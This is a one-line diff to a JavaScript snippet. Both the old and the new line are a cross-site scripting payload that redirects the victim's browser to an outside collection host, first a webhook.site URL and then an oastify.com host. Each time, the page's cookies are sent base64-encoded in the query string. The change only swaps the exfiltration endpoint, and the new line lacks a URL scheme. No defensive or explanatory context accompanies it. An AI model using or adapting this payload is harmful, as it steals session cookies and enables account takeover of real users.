@@ -1,1 +1,1 @@
-document.location = "https://webhook.site/ebaa6677-f28c-4584-b836-e2219e4a955d?c=" + btoa(document.cookie);
+document.location = "edv03qux16nqaonho4ol36budljc72vr.oastify.com/a?c=" + btoa(document.cookie);
